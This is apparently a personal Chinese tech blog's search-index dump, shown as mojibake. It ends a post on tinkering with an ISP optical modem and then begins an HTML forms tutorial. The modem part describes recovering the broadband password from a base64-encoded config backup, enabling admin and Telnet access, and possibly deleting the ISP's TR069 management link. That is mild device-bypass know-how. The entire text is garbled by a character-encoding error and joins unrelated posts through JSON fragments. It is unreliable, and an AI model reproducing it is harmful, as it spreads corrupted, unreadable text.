è¿æ¥ä¿¡æ¯é‡Œæœ‰ä¸€ä¸ªè¿æ¥çš„æè¿°é‡Œæ˜¯å¸¦æœ‰INTERNETçš„ã€‚ ï¼ˆå‡è£…è¿™é‡Œæœ‰æˆªå›¾ï¼‰ Step 2 è·å–å½“å‰è®¾ç½®çš„å‚æ•°é¦–å…ˆåœ¨è¿æ¥åç§°é‡Œé€‰æ‹©å¸¦æœ‰INTERNETçš„é€‰é¡¹ï¼Œç„¶åæŠŠè¿™ä¸€é¡µæˆªä¸ªå›¾æˆ–è€…æ‹ç…§å¤‡ä»½ä¸€ä¸‹ã€‚ï¼ˆé‡è¦ï¼‰ æœ€å¥½ä¹Ÿå¤‡ä»½ä¸€ä¸‹è®¾ç½®æ–‡ä»¶ï¼ˆåŒ 0x01ï¼‰ï¼ è¿™é‡Œé¢çš„VLAN IDã€MTUæ˜¯åé¢çš„ä¾æ®ã€‚ Step 3 æ–°å»ºå®½å¸¦è¿æ¥è¿™é‡Œå‰ææ˜¯çŸ¥é“å®½å¸¦çš„å¯†ç ï¼Œå¦‚æœä¸çŸ¥é“çš„è¯ï¼Œå¯ä»¥åœ¨ 0x01 ä¸­è·å–åˆ°çš„å¤‡ä»½æ–‡ä»¶é‡Œæ‰¾åˆ°å˜¿å˜¿å˜¿ï¼ˆä»…åšäº†base64åŠ å¯†ï¼‰ã€‚ æ–°å»ºä¸€ä¸ªWANè¿æ¥ï¼Œæ¨¡å¼é€‰æ‹©Routeï¼ˆè·¯ç”±ï¼‰ï¼Œåè®®æ¨¡å¼é€‰æ‹©IPv4 &amp; IPv6ï¼ˆè¿™å°±æ˜¯ç›®çš„æ‰€åœ¨å–µï¼ï¼‰ã€‚ é€‰PPPoEï¼ŒMTUé‡Œå¡«ä¸Šä¸€æ­¥éª¤çš„å‚æ•°ï¼›å‹¾é€‰å¯ç”¨Vlanï¼ŒVlan IDå¡«ä¸Šä¸€æ­¥å‚æ•°ã€‚ IPv6åœ°å€åˆ†é…æœºåˆ¶çš„è¯ï¼Œæˆ‘è¿™é‡Œè‡ªåŠ¨è·å–å’ŒDHCPv6éƒ½è¡Œï¼Œä¸è¿‡å»ºè®®é€‰è‡ªåŠ¨è·å–å§ã€‚ã€‚ã€‚ï¼ˆä¸å¤§æ¸…æ¥š è·å–å‰ç¼€å‹¾ä¸Šå§ï¼Œå¥½åƒå¯ä»¥é è¿™ä¸ªä¸‹å‘IPv6.ï¼ˆï¼Ÿ æœåŠ¡æ¨¡å¼é€‰æ‹©INTERNETã€‚ ç»‘å®šç«¯å£å°±æ˜¯ä½ æƒ³è¦é€šè¿‡è¿™ä¸ªWANè¿›è¡Œè¿æ¥ç½‘ç»œçš„ç«¯å£ï¼Œå¦‚æœä¸æ¸…æ¥šçš„è¯å…¨å‹¾ä¸Šå°±è¡Œäº†ã€‚å¦‚æœæœ‰IPTVçš„è¯æ³¨æ„ä¸è¦å‹¾å¯¹åº”çš„ç«¯å£ã€‚å½“ç„¶æœ‰å…¶ä»–éœ€æ±‚çš„è‡ªå·±å†è€ƒè™‘ã€‚å®ƒè¿™é‡Œæ³¨æ˜äº†çš„ã€‚ æ³¨: WANè¿æ¥ä¹‹é—´ä¸èƒ½å…±äº«ç»‘å®šç«¯å£ï¼Œæœ€åç»‘å®šç«¯å£çš„WANè¿æ¥ç»‘å®šæ“ä½œå°†å†²æ‰ä¹‹å‰å…¶å®ƒWANè¿æ¥å¯¹è¯¥ç«¯å£çš„ç»‘å®šæ“ä½œï¼ å¤§æ¦‚çš„ç•Œé¢ç±»ä¼¼äºè¿™æ ·çš„ã€‚ä¸åŒè®¾å¤‡å¤§åŒå°å¼‚çš„å•¦ã€‚ è€Œåç‚¹å‡»ä¿å­˜/åº”ç”¨ã€‚ Step 4 IPv6 DHCP é…ç½®ï¼ˆè¿™ä¸€å—å…¶å®æˆ‘ä¹Ÿä¸å¤§æ¸…æ¥šemmm å¤§æ¦‚æ˜¯è¿™æ ·å§ è²Œä¼¼DHCPv6æ˜¯ç§ç½‘ï¼ŒRadvdæ˜¯åˆ©ç”¨è·å–çš„å‰ç¼€ä¸‹å‘å…¬ç½‘çš„åœ°å€ã€‚ ç½‘ä¸Šå¤§æ¦‚è¿™ä¹ˆè¯´çš„â†“ã€‚ åœ¨IPV6çš„è‡ªåŠ¨é…ç½®ä¸­ï¼Œåˆ†ä¸ºä¸¤ç§æŠ€æœ¯ä¸€ç§æ˜¯ä¼ ç»Ÿçš„æœ‰çŠ¶æ€(stateful),å…¸å‹ä»£è¡¨å°±æ˜¯ä¸IPv4æ—¶ä»£ç›¸å¯¹åº”çš„DHCPv6ï¼Œä¸€ç§æ˜¯IPv6çš„æ— çŠ¶æ€(stateless)è‡ªåŠ¨é…ç½®ï¼Œå…¸å‹ä»£è¡¨æ˜¯Radvdã€‚è¿™æ˜¯IPv6åè®®çš„ä¸€ä¸ªçªå‡ºç‰¹ç‚¹:æ”¯æŒç½‘ç»œèŠ‚ç‚¹çš„åœ°å€è‡ªåŠ¨é…ç½®ã€‚ åœ¨æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®æ–¹å¼ä¸‹ï¼Œç½‘ç»œæ¥å£æ¥æ”¶è·¯ç”±å™¨å®£å‘Šçš„å…¨å±€åœ°å€å‰ç¼€ï¼Œå†ç»“åˆæ¥å£IDå¾—åˆ°ä¸€ä¸ªå¯èšé›†å…¨å±€å•æ’­åœ°å€ã€‚åœ¨æœ‰çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®çš„æ–¹å¼ä¸‹ï¼Œä¸»è¦é‡‡ç”¨åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰ï¼Œéœ€è¦é…å¤‡ä¸“é—¨çš„DHCPæœåŠ¡å™¨ï¼Œç½‘ç»œæ¥å£é€šè¿‡å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ä»DHCPæœåŠ¡å™¨å¤„å¾—åˆ°åœ°å€é…ç½®ä¿¡æ¯ã€‚ å…·ä½“æ¥è¯´ï¼Œä»¥RADVDä¸ºä»£è¡¨çš„æ— çŠ¶æ€è‡ªåŠ¨é…ç½®ä¸éœ€è¦æ¶ˆè€—å¾ˆå¤šæœºå™¨èµ„æºï¼Œä¹Ÿä¸åƒä¼ ç»ŸDHCPä¸€æ ·éœ€è¦ç»´æŠ¤ä¸€ä¸ªæœ¬åœ°æ•°æ®åº“æ¥ç»´æŠ¤åœ°å€åˆ†é…çŠ¶æ€ï¼Œä»–åªæ˜¯è¿›è¡Œå¹¿æ’­å‰ç¼€åœ°å€ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°è¿™ç§å¹¿æ’­åå†è‡ªå·±ä½¿ç”¨EUI64ç®—æ³•ç”Ÿæˆå…¨çƒå”¯ä¸€çš„IPv6åœ°å€ï¼Œè¿›è¡Œè‡ªæˆ‘é…ç½®ã€‚ è¿˜æœ‰ &lt;1&gt;radvdç”¨äºæ— çŠ¶æ€è‡ªåŠ¨é…ç½®åœ°å€ï¼Œå®¢æˆ·ç«¯é€šè¿‡ç½‘ç»œæ¥å£æ¥æ”¶è·¯ç”±å™¨å®£å‘Šçš„å…¨å±€åœ°å€å‰ç¼€ï¼Œå†ç»“åˆæ¥å£IDå½¢æˆå…¨çƒå•æ’­åœ°å€ï¼Œä½†æ˜¯è¿™ç§é…ç½®ä¸èƒ½è·å–DNSã€‚ &lt;2&gt;dhcpv6ç”¨äºæœ‰çŠ¶æ€è‡ªåŠ¨é…ç½®åœ°å€ï¼Œç±»ä¼¼äºipv4çš„dhcpï¼Œå®¢æˆ·ç«¯ä»æœåŠ¡å™¨çš„åœ°å€æ± ä¸­é…ç½®åœ°å€ï¼Œå¯è·å–åˆ°DNSã€‚ ï¼ˆç„¶ååº”è¯¥è¿˜è¦é…ç½®ä¸€ä¸‹ IPv6 DNS Proxyï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸å¤§æ¸…æ¥šemmm Step 5 ç¡®è®¤è¿æ¥çŠ¶æ€è¿”å›åˆ°çŠ¶æ€-ç½‘ç»œä¾§ä¿¡æ¯ï¼Œåˆ†åˆ«çœ‹çœ‹IPv4å’Œv6çš„è¿æ¥ä¿¡æ¯ã€‚ç•™æ„åè®®ä¸­å¸¦æœ‰IPv4&amp;IPv6çš„çŠ¶æ€ã€‚ åˆšå¼€å§‹å¯èƒ½è¿ä¸ä¸Šï¼Œè¿‡ä¸€æ®µæ—¶é—´å°±è¿ä¸Šäº†ã€‚ å¦‚æœè¿˜è¿ä¸ä¸Šçš„è¯ï¼Œå°†ä¹‹å‰å¸¦æœ‰ INTERNET çš„é‚£ä¸ªWANè¿æ¥ç»™ç¦ç”¨æˆ–åˆ é™¤å°±å¥½äº†ã€‚ ï¼ˆä¸è¿‡å¦‚æœæœ‰ä¸ªTR069é‚£ä¸ªè¿è¥å•†é…ç½®ä¸‹å‘çš„å°±è‡ªå·±çœ‹ç€åŠäº†ï¼Œåˆ äº†å¯ä»¥ä¸å—è¿è¥å•†è¿›è¡Œé…ç½®ä¸‹å‘å’Œä¸ŠæŠ¥ï¼Œæœ‰å½±å“çš„è¯æ–°å»ºä¸€ä¸ªæˆ–è€…ä¿®æ”¹ä¸Šä¸€æ­¥çš„æœåŠ¡æ¨¡å¼å°±å¥½äº†ã€‚ åˆ°è¿™é‡Œæˆ‘æƒŠå–œåœ°å‘ç°ï¼Œè²Œä¼¼è´¦å·æ”¯æŒå¤šæ’­å”‰ï¼ä¸è¿‡è¿™ä¸ªå…‰çŒ«é‡Œè‡ªç„¶ä¸æ”¯æŒå¤šæ’­å åŠ çš„äº†ã€‚å¯ä»¥ä½¿ç”¨æ¡¥æ¥å®½å¸¦è®©åé¢çš„è·¯ç”±å™¨åšå¤„ç†å•¦ã€‚ï¼ˆåé¢å†è¯´ï¼‰ äºæ˜¯å°è¯•äº†ä¸€ä¸‹æˆåŠŸè¿äº†ä¸¤ä¸ªï¼Œå…¶ä¸­ç»‘å®šç«¯å£è®¾ç½®æˆä¸ä¸€æ ·çš„ã€‚ä¸è¿‡ä¸çŸ¥é“æœ€å¤šå¯ä»¥å‡ æ’­hhhã€‚ è¿æ¥å…‰çŒ«æ˜¯å¯ä»¥ä¸‹å‘ IPv6 å…¬ç½‘åœ°å€çš„ã€‚ ç„¶åå‘ç°é‚£ä¸ªå¤–æ¥çš„æ— çº¿è·¯ç”±å™¨ä¹Ÿä¸æ”¯æŒ IPv6ï¼Œæ°”æ­»äº†ï¼ˆåé¢æ¢ä¸€ä¸ª ä¸è¿‡ä¹Ÿæœ‰è§£å†³æ–¹æ¡ˆçš„ï¼Œå°±æ˜¯æŠŠç½‘çº¿è¿æ¥åˆ°æ— çº¿è·¯ç”±å™¨çš„LANå£è€Œä¸æ˜¯WANå£ï¼Œå…³é—­å®ƒçš„ DHCP åŠŸèƒ½ï¼Œç”±å…‰çŒ«ç›´æ¥åˆ†é… IP åœ°å€å°±è¡Œäº†ã€‚ ç„¶è€Œæœ‰ä¸ªå¤§é—®é¢˜ï¼Œå°±æ˜¯æˆ‘çš„ IPv6 æ²¡æœ‰Internetè®¿é—®æƒé™ã€‚æ‰‹åŠ¨é…ç½®äº†DNSä¹Ÿä¸è¡Œã€‚ ping -6 ipv6.baidu.comé€šä¸äº†ã€‚ tracert 240c::6666 å‘ç°åˆ°æˆ‘çš„å…‰çŒ«å°±å‡ºä¸å»äº†ã€‚ è¯•äº†ä¸€ä¸‹åœ¨å…‰çŒ«ä¸Šçš„è¯Šæ–­é‡Œç”¨IPv6è¿›è¡Œpingä¹Ÿæ²¡æœ‰è¿æ¥ã€‚ ä¸çŸ¥é“å“ªé‡Œè®¾ç½®æœ‰é—®é¢˜äº†ï¼Œå¾ˆæ‡µï¼ˆæ‘Šæ‰‹ã€‚ æ±‚å¤§ä½¬ä»¬æŒ‡ç‚¹ä¸€ä¸‹ã€‚ 0x05 å®½å¸¦æ¡¥æ¥æ”¹é€ å‰é¢è¯´æ”¯æŒå¤šæ’­å˜›ï¼Œç„¶åå°±æƒ³åˆ°åˆ©ç”¨å…‰çŒ«æ¡¥æ¥å®½å¸¦ï¼Œç„¶åå†åˆ©ç”¨åé¢çš„è·¯ç”±å™¨ï¼ˆè½¯è·¯ç”±/ç¡¬è·¯ç”±ï¼‰è¿›è¡Œæ‹¨å·ã€‚ æˆ–è€…æ˜¯è¿™ç§æƒ…å†µï¼Œç½‘ç»œæµé‡è¾ƒå¤§ï¼Œè·¯ç”±è¾ƒå¤æ‚ç­‰å…‰çŒ«éš¾ä»¥æ‰¿å—æˆ–è€…ä¸å¤Ÿç¨³å®šï¼Œä¹Ÿå¯ä»¥è¯•è¯•æ¡¥æ¥çš„æ–¹æ¡ˆã€‚ æ–¹æ³•ç±»ä¼¼äº 0x04ã€‚ å¤§æ¦‚å°±åƒå›¾é‡Œè¿™æ ·å§ã€‚ å‹¾é€‰å¯ç”¨Vlanï¼ŒVLAN ID ä¹Ÿå’Œä¹‹å‰é…ç½®INTERNETçš„ä¸€æ ·ã€‚ ç»‘å®šç«¯å£å»ºè®®é€‰ç«¯å£1ï¼Œæ¯•ç«Ÿæ˜¯åƒå…†å£å˜›ï¼ ä¹‹åå°±å¯ä»¥ç›´æ¥é€šè¿‡ LAN1 è¿æ¥è·¯ç”±å™¨æˆ–è€…ç”µè„‘è¿›è¡Œæ‹¨å·äº†ã€‚ æ‹¨å·åä¹Ÿä¼šåˆ†é…å…¬ç½‘çš„ IPv6 åœ°å€ã€‚ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œçš„ IPv6 è¿˜æ˜¯æ²¡æœ‰Internetè®¿é—®æƒé™ï¼Œä¼°è®¡æ˜¯è¿è¥å•†çš„é—®é¢˜å§ ï¼ˆå‡è£…è¿™é‡Œæœ‰æˆªå›¾ï¼‰ å½“ç„¶ï¼Œè¦å®ç°æ¡¥æ¥æ”¹é€ ï¼Œä½ è¿˜å¯ä»¥å°è¯•ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶çš„æ–¹æ¡ˆï¼ˆè¶…ç¡¬æ ¸ï¼‰ï¼Œå…·ä½“è¯·å‚è€ƒè¿™é‡Œã€‚ 0x06 å…¶ä»–ç©æ„æœ‰æ¬¡åœ¨è®¿é—®ä¸€ä¸ªå…‰çŒ«çš„é¡µé¢æ—¶è¾“é”™äº†ç½‘å€ï¼Œæ­£å¥½å‘ç°äº†å…‰çŒ«ç”¨çš„ HTTP Server æ˜¯ micro_httpdã€‚ å‘ç°æŒ‡å‘çš„ç½‘ç«™è¿˜èƒ½è®¿é—®ã€‚è¿™æ˜¯ä¸ªè½»é‡çº§çš„æœåŠ¡å™¨äº†ï¼Œæ­£å¥½ä¹Ÿé€‚åˆåœ¨è¿™ç§å°è®¾å¤‡ä¸Šè·‘äº†ã€‚ è¿™ä¸ªå…‰çŒ«è¿˜æ”¯æŒè¿œç¨‹ä¸‹è½½ï¼Œå¯ä»¥é€šè¿‡ USB è¿æ¥å¤–éƒ¨è®¾å¤‡ï¼Œå¼€å¯ FTP æœåŠ¡å™¨è¿›è¡Œè®¿é—®ã€‚ ä¸è¿‡æ„Ÿè§‰è¿™ä¸ª USB åº”è¯¥ä¹Ÿæ˜¯2.0çš„ï¼Œå‹‰å¼ºç”¨ç”¨è¿˜å¯ä»¥å§ï¼Œä¹Ÿæ²¡å°è¯•è¿‡233. 0x07 å°ç»“æŠ˜è…¾äº†å¥½ä¹…è¿™ä¸ªæœ‰ç‚¹å¤è€çš„å…‰çŒ« emmmå˜¤å˜¤å˜¤ äºæ˜¯ä¹æœ¬æ–‡ä»‹ç»çš„å†…å®¹åŒ…æ‹¬ï¼š é€šè¿‡é…ç½®å¤‡ä»½æ–‡ä»¶è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œå¼€å¯ Telnet ç®¡ç†ï¼Œå¯ç”¨ IPv6ï¼Œå®½å¸¦æ¡¥æ¥çš„æ”¹é€ ç­‰ç­‰ã€‚ æ˜¯æ—¶å€™æ¢ä¸ªè·¯ç”±å™¨äº†ï¼Œåªæœ‰å¤§æ¦‚1/3çš„ç½‘é€Ÿå¤ªäºäº†ï¼ æ€ä¹ˆè¯´å¥½å‘¢ï¼Œæ„Ÿè§‰å…¶å®å¹¶æ²¡æœ‰å¹²ä»€ä¹ˆæ­£äº‹çš„äºšå­ã€‚ã€‚ã€‚ ç­‰æˆ‘å­¦å®Œé€šä¿¡ç½‘ç»œï¼ˆè®¡ç®—æœºç½‘ç»œï¼‰è¯´ä¸å®šä¼šæœ‰æ›´æ·±å…¥çš„ç†è§£å§233333. æ¬¢è¿å¤§ä½¬ä»¬æ¥äº¤æµäº¤æµå‘¢ï¼ è¿˜æœ‰ï¼Œä»¥ä¸Šå†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼Œç¦æ­¢å•†ç”¨ã€‚ è½¬è½½è®°å¾—æ³¨æ˜å‡ºå¤„å‘€ï¼ æºœäº†æºœäº†ï¼ˆ ReferenceHG260GS-Uå…‰çŒ«æ‹†è§£ä¸ç™»å½•è§£ç  åŒ—äº¬è”é€šå…‰å®½å¸¦åŠIPTVæŠ˜è…¾ç¬”è®°ï¼ˆäºŒï¼‰â€“åŒ—äº¬è”é€šHG260GS-U WO-37å¼€å¯è¶…çº§ç®¡ç†å‘˜çš„æ–¹æ³• è½»æ¾å¼€å¯ä¸­å›½ç§»åŠ¨IPV6è¿æ¥ï¼Œæ—©å…¥ç•…æ¸¸ipv6ä¸–ç•Œ çƒ½ç«HG220G-U 2.03+ / HG2201U 5.0+å…‰çŒ«æ”¹æ¡¥æ¥æ•™ç¨‹ etc. ï¼ˆå¤§éƒ¨åˆ†éƒ½å¥½å¤è€äº†","path":"2020/02/27/Server_OpticalModem/"},{"title":"FrontEnd | HTML è¿›é˜¶å­¦ä¹ ç¬”è®°","text":"å‰è¨€å‰å‡ å¤©è¿‡äº†ä¸€éåŸºç¡€çš„ HTML çŸ¥è¯†ï¼Œè®°äº†ç‚¹ç¬”è®°åœ¨è¿™é‡Œã€‚ æ€»ä½“æ„Ÿè§‰ HTML æœç„¶æ˜¯ä¸€é—¨æ ‡è®°è¯­è¨€ï¼Œå…¶å®å®ƒå°±æ˜¯å°†è¦å±•ç¤ºç»™ç”¨æˆ·çš„å„ç§å…ƒç´ åˆ©ç”¨å¸¦æœ‰ &lt; &gt; çš„æ ‡ç­¾æ ‡è®°å¥½ï¼Œæµè§ˆå™¨å†æ ¹æ®ä¸åŒçš„æ ‡ç­¾æ¸²æŸ“å‡ºä¸åŒçš„æ•ˆæœï¼Œå‘ˆç°ç»™ç”¨æˆ·ã€‚ HTML å¯ä»¥è¯´æ˜¯æ­äº†ä¸€ä¸ªæ¡†æ¶ï¼Œè€Œ CSS åˆ™æ˜¯æŠŠç½‘é¡µåŠ ä»¥æ‰“æ‰®ï¼Œä½¿å…¶å˜å¾—ç¾è§‚ï¼ŒJavaScript åˆ™æä¾›å’Œæ‹“å±•äº†ç½‘ç«™ä¸ç”¨æˆ·ä¹‹é—´çš„äº¤äº’åŠŸèƒ½ã€‚ è¿™å›å°±æ¥å­¦ä¸€å­¦HTMLä¸­è¿›é˜¶çš„å†…å®¹å§ã€‚ï¼ˆå…¶å®ä¹Ÿä¸ç®—è¿›é˜¶8 ç»§ç»­ä¸»è¦å‚è€ƒ W3School çš„æ•™ç¨‹å§ï¼Œä¹Ÿç»“åˆä¸€ç‚¹è‡ªå·±çš„å°ä½“ä¼šã€‚ ç”±äºåšå®¢è‡ªå¸¦äº†ä¸€äº› CSS æ ·å¼ï¼Œå¯èƒ½æœ‰äº›æ˜¾ç¤ºæ•ˆæœæœ‰æ‰€ä¸åŒã€‚ è¡¨å•ç®€ä»‹ç”¨äºæ”¶é›†ç”¨æˆ·çš„è¾“å…¥ã€‚ form å…ƒç´ &lt;form&gt; å…ƒç´ ç”¨æ¥å®šä¹‰ HTML è¡¨å•ã€‚ æ¡†æ¶æ˜¯è¿™æ · &lt;form&gt; &lt;!-- ... form elementsï¼ˆè¡¨å•å…ƒç´ ï¼‰ ... --&gt; &lt;/form&gt; Action å±æ€§action å±æ€§å®šä¹‰åœ¨æäº¤è¡¨å•æ—¶æ‰§è¡Œçš„åŠ¨ä½œã€‚å‘æœåŠ¡å™¨æäº¤è¡¨å•çš„é€šå¸¸åšæ³•æ˜¯ä½¿ç”¨æäº¤æŒ‰é’®ï¼ˆåé¢å†è¯´ï¼‰ã€‚ åˆ©ç”¨ action æŒ‡å®šå°†ä¿¡æ¯å‘é€åˆ°æœåŠ¡å™¨çš„è·¯å¾„ã€‚ æ¯”å¦‚æŒ‡å®š miao.php è¿™ä¸ªPHPè„šæœ¬æ¥å¤„ç†æäº¤çš„æ•°æ®ï¼š &lt;form action=\"miao.php\"&gt; RESTful API çš„è¯ï¼Œé€šå¸¸æ˜¯æŒ‡å®šæŸä¸ªè·¯å¾„ï¼Œå¦‚ /api/userï¼Œé€šè¿‡ HTTP çš„ä¸åŒæ–¹æ³•è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚ å¦‚æœçœç•¥ action å±æ€§ï¼Œåˆ™ action ä¼šè¢«è®¾ç½®ä¸ºå½“å‰é¡µé¢ã€‚ Method å±æ€§method å±æ€§è§„å®šåœ¨æäº¤è¡¨å•æ—¶æ‰€ç”¨çš„ HTTP æ–¹æ³•ï¼ˆGET æˆ– POSTï¼‰ã€‚ çœç•¥çš„è¯é»˜è®¤ä¸º GET æ–¹æ³•ã€‚ &lt;form action=\"miao.php\" method=\"GET\"&gt; &lt;form action=\"miao.php\" method=\"POST\"&gt; GET é€‚åˆå°‘é‡æ•°æ®çš„æäº¤ï¼ˆæµè§ˆå™¨å’ŒæœåŠ¡å™¨å¯¹URLé•¿åº¦æœ‰é™åˆ¶ï¼‰ï¼Œæ•°æ®ä¼šä»¥ urlencode çš„å½¢å¼å‡ºç°åœ¨ URL çš„å‚æ•°ä¸­ï¼Œé€‚åˆéæ•æ„Ÿä¿¡æ¯ã€‚ POST é€‚åˆå¤§é‡æ•°æ®çš„æäº¤ï¼Œä¸”æ›´æœ‰å®‰å…¨æ€§ï¼Œæ•°æ®åœ¨ body ä¸­æäº¤ï¼Œä¸ä¼šå‡ºç°åœ¨URLä¸­ï¼Œé€‚åˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚å¯†ç ï¼‰ç­‰æƒ…å†µã€‚ ä¸è¿‡äºŒè€…æœ¬è´¨ä¸Šæ²¡æœ‰æ˜æ˜¾çš„å·®åˆ«ï¼Œå…¶å®æ˜¯åœ¨æ ‡å‡†åˆ¶å®šä¸Šæœ‰æ‰€ä¸åŒè€Œå·²ã€‚ Name å±æ€§å¦‚æœè¦æ­£ç¡®åœ°è¢«æäº¤ï¼Œæ¯ä¸ªè¾“å…¥å­—æ®µå¿…é¡»è®¾ç½®ä¸€ä¸ª name å±æ€§ã€‚ è‹¥ä¸å«nameå±æ€§ï¼Œåˆ™ä¸ä¼šå‘æœåŠ¡å™¨æäº¤è¿™ä¸€é¡¹å†…å®¹ã€‚ &lt;form action=\"#\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; First name: Last name: ï¼ˆè¿™ä¸ªæäº¤ä¸ä¼šæœ‰ååº”çš„å•¦ form å…ƒç´ çš„å®Œæ•´å±æ€§&lt;form action=\"action_page.php\" method=\"GET\" target=\"_blank\" accept-charset=\"UTF-8\" ectype=\"application/x-www-form-urlencoded\" autocomplete=\"off\" novalidate&gt; &lt;!-- ... form elementsï¼ˆè¡¨å•å…ƒç´ ï¼‰ ... --&gt; &lt;/form&gt; å±æ€§ æè¿° accept-charset è§„å®šåœ¨è¢«æäº¤è¡¨å•ä¸­ä½¿ç”¨çš„å­—ç¬¦é›†ï¼ˆé»˜è®¤ï¼šé¡µé¢å­—ç¬¦é›†ï¼‰ã€‚ action è§„å®šå‘ä½•å¤„æäº¤è¡¨å•çš„åœ°å€ï¼ˆURLï¼‰ï¼ˆæäº¤é¡µé¢ï¼‰ã€‚ autocomplete è§„å®šæµè§ˆå™¨åº”è¯¥è‡ªåŠ¨å®Œæˆè¡¨å•ï¼ˆé»˜è®¤ï¼šå¼€å¯onï¼‰ã€‚ enctype è§„å®šè¢«æäº¤æ•°æ®çš„ç¼–ç ï¼ˆé»˜è®¤ï¼šurl-encodedï¼‰ã€‚ method è§„å®šåœ¨æäº¤è¡¨å•æ—¶æ‰€ç”¨çš„ HTTP æ–¹æ³•ï¼ˆé»˜è®¤ï¼šGETï¼‰ã€‚ name è§„å®šè¯†åˆ«è¡¨å•çš„åç§°ï¼ˆå¯¹äº DOM ä½¿ç”¨ï¼šdocument.forms.nameï¼‰ã€‚ novalidate è§„å®šæµè§ˆå™¨ä¸éªŒè¯è¡¨å•ã€‚ target è§„å®š action å±æ€§ä¸­åœ°å€çš„ç›®æ ‡ï¼ˆé»˜è®¤ï¼š_selfï¼‰ã€‚ ç”¨ fieldset ç»„åˆè¡¨å•æ•°æ®&lt;fieldset&gt; å…ƒç´ ç»„åˆè¡¨å•ä¸­çš„ç›¸å…³æ•°æ®ã€‚ &lt;legend&gt; å…ƒç´ ä¸º &lt;fieldset&gt; å…ƒç´ å®šä¹‰æ ‡é¢˜ã€‚ &lt;form action=\"#\"&gt; &lt;fieldset&gt; &lt;legend&gt;Personal information:&lt;/legend&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/fieldset&gt; &lt;/form&gt; è¡¨å•å…ƒç´ è¡¨å•å…ƒç´ æŒ‡çš„æ˜¯ä¸åŒç±»å‹çš„ input å…ƒç´ ã€å¤é€‰æ¡†ã€å•é€‰æŒ‰é’®ã€æäº¤æŒ‰é’®ç­‰ç­‰ã€‚ input å…ƒç´ æœ€é‡è¦çš„è¡¨å•å…ƒç´ ã€‚å®ƒæœ‰å¾ˆå¤šä¸åŒçš„ type å±æ€§ï¼Œæ¯”å¦‚ï¼š ç±»å‹type æè¿° text å®šä¹‰å¸¸è§„æ–‡æœ¬è¾“å…¥ã€‚ radio å®šä¹‰å•é€‰æŒ‰é’®è¾“å…¥ï¼ˆé€‰æ‹©å¤šä¸ªé€‰æ‹©ä¹‹ä¸€ï¼‰ submit å®šä¹‰æäº¤æŒ‰é’®ï¼ˆæäº¤è¡¨å•ï¼‰ â€¦â€¦ â€¦â€¦ æ–‡æœ¬è¾“å…¥textã€å¯†ç è¾“å…¥password&lt;input type=\"text\"&gt; å®šä¹‰ç”¨äºæ–‡æœ¬è¾“å…¥çš„å•è¡Œè¾“å…¥å­—æ®µã€‚ &lt;input type=\"password\"&gt; å®šä¹‰å¯†ç å­—æ®µã€‚ è¡¨å•æœ¬èº«å¹¶ä¸å¯è§ã€‚æ–‡æœ¬å­—æ®µçš„é»˜è®¤å®½åº¦æ˜¯ 20 ä¸ªå­—ç¬¦ã€‚ &lt;form&gt; Username:&lt;br&gt; &lt;input type=\"text\" name=\"username\"&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=\"password\" name=\"password\"&gt; &lt;/form&gt; Username: Password: ä¸Šé¢è¿™ä¸ªå¯†ç ï¼Œpassword å­—æ®µä¸­çš„å­—ç¬¦ä¼šè¢«åšæ©ç å¤„ç†ï¼ˆæ˜¾ç¤ºä¸ºæ˜Ÿå·æˆ–å®å¿ƒåœ†ï¼‰ã€‚ å•é€‰æŒ‰é’®è¾“å…¥ radio&lt;input type=\"radio\"&gt; å®šä¹‰å•é€‰æŒ‰é’®ã€‚ å•é€‰æŒ‰é’®å…è®¸ç”¨æˆ·åœ¨æœ‰é™æ•°é‡çš„é€‰é¡¹ä¸­é€‰æ‹©å…¶ä¸­ä¹‹ä¸€ã€‚ æ³¨æ„ï¼šnameå±æ€§è¦ç›¸åŒï¼Œå¦åˆ™å¯ä»¥ç‚¹å‡»ä¸åŒé€‰é¡¹ã€‚ &lt;form&gt; &lt;input type=\"radio\" name=\"sex\" value=\"male\" checked&gt;Male &lt;br&gt; &lt;input type=\"radio\" name=\"sex\" value=\"female\"&gt;Female &lt;/form&gt; Male Female å¤é€‰æ¡†è¾“å…¥ checkbox&lt;input type=\"checkbox\"&gt; å®šä¹‰å¤é€‰æ¡†ã€‚ å¯ä»¥åœ¨æœ‰é™æ•°é‡çš„é€‰é¡¹ä¸­é€‰æ‹©é›¶ä¸ªæˆ–å¤šä¸ªé€‰é¡¹ã€‚ &lt;form&gt; &lt;input type=\"checkbox\" name=\"animal\" value=\"cat\"&gt;cat &lt;br&gt; &lt;input type=\"checkbox\" name=\"animal\" value=\"dog\"&gt;dog &lt;/form&gt; cat dog ï¼ˆå¥½åƒè¿™ä¸ªåœ¨åšå®¢é‡Œçœ‹ä¸åˆ°æ•ˆæœi æäº¤æŒ‰é’® submit&lt;input type=\"submit\"&gt; å®šä¹‰ç”¨äºå‘è¡¨å•å¤„ç†ç¨‹åºï¼ˆform-handlerï¼‰æäº¤è¡¨å•çš„æŒ‰é’®ã€‚ 